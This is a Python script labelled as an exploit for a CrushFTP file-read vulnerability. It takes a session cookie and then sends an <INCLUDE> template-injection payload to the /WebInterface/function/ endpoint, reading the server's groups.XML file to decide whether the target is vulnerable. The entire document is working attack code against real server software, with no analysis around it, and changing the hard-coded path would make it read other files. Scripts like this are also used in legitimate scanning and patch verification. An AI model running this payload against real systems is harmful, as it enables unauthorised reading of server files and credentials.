#!/usr/bin/env python3

import requests
import argparse
import sys
import re

def get_cookies(url):
    response = requests.post(f"{url}/WebInterface/")
    if "CrushAuth" in response.cookies:
        return response.cookies
    else:
        raise ValueError("CrushAuth cookie not found. Authentication failed.")

def read_file(url, file_path, cookies):
    payload = {
        "command": "exists",
        "paths": f"<INCLUDE>{file_path}</INCLUDE>",
        "c2f": cookies['currentAuth']
    }
    response = requests.post(f"{url}/WebInterface/function/", data=payload, cookies=cookies)
    return response.text

def main():
    parser = argparse.ArgumentParser(description="Exploit script for CrushFTP File Read Vulnerability")
    parser.add_argument("target", type=str, help="URL of the target CrushFTP server (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    try:
        cookies = get_cookies(args.target)
        file_path = 'users/MainUsers/groups.XML'
        file_content = read_file(args.target, file_path, cookies)
        if '<groups' in file_content:
            print("The CrushFTP instance seems to be vulnerable.")
        else:
            print("The CrushFTP instance seems NOT to be vulnerable.")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    sys.exit(main())
